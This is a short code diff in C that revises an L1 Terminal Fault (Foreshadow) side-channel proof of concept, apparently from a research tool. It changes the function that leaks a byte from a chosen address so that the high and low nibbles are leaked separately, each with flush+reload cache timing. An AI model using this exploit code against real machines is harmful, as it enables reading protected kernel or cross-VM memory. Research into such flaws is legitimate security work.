@@ -23,13 +23,15 @@
 #define THRESHOLD 150
 
 uint8_t l1tf_full(void *leak_addr, reload_buffer_t reload_buffer) {
-  flush(AMOUNT_OF_RELOAD_PAGES, PAGE_SIZE, (void *)reload_buffer);
-  asm_l1tf_leak_nibbles(leak_addr, reload_buffer);
-
-  size_t low = reload(AMOUNT_OF_OPTIONS_IN_NIBBLE, PAGE_SIZE,
-                      (void *)reload_buffer[0], THRESHOLD);
+  flush(AMOUNT_OF_OPTIONS_IN_NIBBLE, PAGE_SIZE, (void *)reload_buffer[0]);
+  asm_l1tf_leak_high_nibble(leak_addr, reload_buffer);
   size_t high = reload(AMOUNT_OF_OPTIONS_IN_NIBBLE, PAGE_SIZE,
-                       (void *)reload_buffer[1], THRESHOLD);
+                       (void *)reload_buffer[0], THRESHOLD);
+
+  flush(AMOUNT_OF_OPTIONS_IN_NIBBLE, PAGE_SIZE, (void *)reload_buffer[1]);
+  asm_l1tf_leak_low_nibble(leak_addr, reload_buffer);
+  size_t low = reload(AMOUNT_OF_OPTIONS_IN_NIBBLE, PAGE_SIZE,
+                      (void *)reload_buffer[1], THRESHOLD);
 
   return ((high & 0x0f) << 4) | (low & 0x0f);
 }
